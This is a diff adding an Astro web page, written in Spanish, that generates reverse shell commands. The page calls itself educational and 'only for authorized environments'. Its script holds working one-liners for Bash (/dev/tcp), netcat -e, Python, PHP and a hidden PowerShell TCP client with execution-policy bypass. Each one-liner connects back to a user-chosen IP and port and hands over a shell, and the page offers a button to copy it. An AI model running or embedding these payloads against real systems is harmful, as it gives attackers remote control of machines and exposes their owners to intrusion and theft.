@@ -1,0 +1,50 @@
+---
+import ToolsLayout from "@/layouts/ToolsLayout.astro";
+---
+
+<ToolsLayout title="RevShell" description="Generador de reverse shells (educativo)">
+  <main class="min-h-0 flex items-center justify-center px-4 py-8">
+    <div class="w-full max-w-2xl bg-card border border-border rounded-xl p-6">
+      <h1 class="text-2xl font-bold text-foreground mb-4 text-center">Reverse Shell</h1>
+      <p class="text-xs text-muted-foreground mb-3 text-center">Solo para entornos autorizados.</p>
+      <div class="flex gap-2 mb-3">
+        <input id="ip" placeholder="IP" class="flex-1 px-3 py-2 bg-background border border-border rounded-lg text-foreground" />
+        <input id="port" placeholder="Puerto" value="4444" class="w-24 px-3 py-2 bg-background border border-border rounded-lg text-foreground" />
+      </div>
+      <select id="type" class="w-full px-3 py-2 bg-background border border-border rounded-lg text-foreground mb-3">
+        <option value="bash">Bash</option>
+        <option value="nc">Netcat</option>
+        <option value="python">Python</option>
+        <option value="php">PHP</option>
+        <option value="powershell">PowerShell</option>
+      </select>
+      <textarea id="out" rows="6" readonly class="w-full px-3 py-2 bg-background border border-border rounded-lg text-foreground font-mono text-sm mb-3"></textarea>
+      <button id="copy" class="px-3 py-2 bg-secondary text-secondary-foreground rounded-lg">Copiar</button>
+    </div>
+  </main>
+  <script is:inline>
+    const shells = {
+      bash: (ip,port) => `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
+      nc: (ip,port) => `nc -e /bin/sh ${ip} ${port}`,
+      python: (ip,port) => `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
+      php: (ip,port) => `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
+      powershell: (ip,port) => `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('${ip}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$s.Write(([text.encoding]::ASCII).GetBytes($r2),0,$r2.Length)}"`,
+    };
+    function render() {
+      const ip = document.getElementById("ip").value || "10.0.0.1";
+      const port = document.getElementById("port").value || "4444";
+      const t = document.getElementById("type").value;
+      document.getElementById("out").value = shells[t](ip,port);
+    }
+    ["ip","port","type"].forEach(id => {
+      const el = document.getElementById(id);
+      el.addEventListener("input", render);
+      el.addEventListener("change", render);
+    });
+    render();
+    document.getElementById("copy").onclick = async () => {
+      await navigator.clipboard.writeText(document.getElementById("out").value);
+      const b = document.getElementById("copy"); b.textContent="Copiado"; setTimeout(()=>b.textContent="Copiar",1500);
+    };
+  </script>
+</ToolsLayout>
